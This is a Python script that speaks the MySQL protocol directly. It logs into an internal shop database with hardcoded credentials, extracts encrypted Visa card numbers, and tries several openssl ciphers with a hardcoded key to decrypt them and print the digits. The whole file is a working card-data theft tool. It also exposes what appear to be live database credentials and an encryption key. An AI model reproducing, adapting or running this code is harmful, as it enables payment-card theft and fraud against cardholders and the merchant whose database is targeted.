import socket,struct,hashlib,base64,subprocess,os
HOST='172.27.140.151'
PORT=3306
USER='dbapipedidoscsb'
PASS='LuPm$TsN9eRP'
DB='tienda'
KEY='8L84j3x3yZY894gyEwFNhDSPSrfyHf9WA'
KEY_HEX=KEY.encode('hex')
def rpkt(sk):
    hdr=''
    while len(hdr)<4:
        hdr+=sk.recv(4-len(hdr))
    ln=struct.unpack('<I',hdr[:3]+'\x00')[0]
    seq=struct.unpack('B',hdr[3])[0]
    data=''
    while len(data)<ln:
        data+=sk.recv(ln-len(data))
    return seq,data
def spkt(sk,seq,data):
    hdr=struct.pack('<I',len(data))[:3]+struct.pack('B',seq)
    sk.sendall(hdr+data)
def auth(sk,user,pwd,db):
    seq,g=rpkt(sk)
    salt=g[4:4+8]
    rest=g[g.index('\x00',4)+1:]
    if len(rest)>31:
        s2=rest[31:]
        i=s2.find('\x00')
        if i>0:salt+=s2[:i]
    h1=hashlib.sha1(pwd).digest()
    h2=hashlib.sha1(h1).digest()
    h3=hashlib.sha1(salt+h2).digest()
    tk=''.join(chr(ord(a)^ord(b))for a,b in zip(h1,h3))
    pkt=struct.pack('<I',0x0000a685)[:-1]+'\x00'
    pkt+=struct.pack('<I',16777216)+'\x21'+'\x00'*23
    pkt+=user+'\x00'+chr(len(tk))+tk+db+'\x00'+'mysql_native_password\x00'
    spkt(sk,1,pkt)
    s2,r=rpkt(sk)
    if r[0]=='\xff':return False,r[3:]
    return True,''
def do_query(sk,sql):
    spkt(sk,0,'\x03'+sql)
    seq,data=rpkt(sk)
    if data[0]=='\xff':return None,data[3:]
    ncols=ord(data[0])
    for _ in range(ncols):rpkt(sk)
    rpkt(sk)
    rows=[]
    while True:
        seq,data=rpkt(sk)
        if data[0]=='\xfe' and len(data)<9:break
        if data[0]=='\xff':break
        row=[];pos=0
        for _ in range(ncols):
            if data[pos]=='\xfb':row.append(None);pos+=1
            else:
                ln=ord(data[pos]);pos+=1
                row.append(data[pos:pos+ln]);pos+=ln
        rows.append(row)
    return rows,None
s=socket.socket()
s.settimeout(10)
s.connect((HOST,PORT))
ok,err=auth(s,USER,PASS,DB)
if not ok:
    print 'AUTH FAIL:'+err
    exit(1)
print 'AUTH OK'
rows,err=do_query(s,"SELECT id,HEX(FROM_BASE64(numero)) FROM datostarjeta WHERE tipo='Visa' ORDER BY id DESC LIMIT 5")
if err:
    print 'QUERY ERR:'+err
    exit(1)
print 'KEY_HEX:'+KEY_HEX
print 'Samples:'
for row in rows:
    rid=row[0]
    hexdata=row[1]
    raw=hexdata.decode('hex')
    iv=raw[:8]
    ct=raw[8:]
    iv_hex=iv.encode('hex')
    ct_hex=ct.encode('hex')
    print 'ID=%s IV=%s CT=%s LEN=%d'%(rid,iv_hex,ct_hex,len(raw))
    f=open('/tmp/ct.bin','wb')
    f.write(ct)
    f.close()
    for cipher in ['bf-cbc','des-ede3-cbc','cast5-cbc','des-cbc','rc2-cbc']:
        cmd='openssl enc -%s -d -nosalt -nopad -K %s -iv %s -in /tmp/ct.bin'%(cipher,KEY_HEX,iv_hex)
        p=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        o,e=p.communicate()
        if p.returncode==0 and len(o)>0:
            nums=''.join(c for c in o if c.isdigit())
            print '  %s OK: %s nums=%s'%(cipher,repr(o),nums)
        else:
            print '  %s FAIL: %s'%(cipher,(e or '').strip()[:60])
s.close()
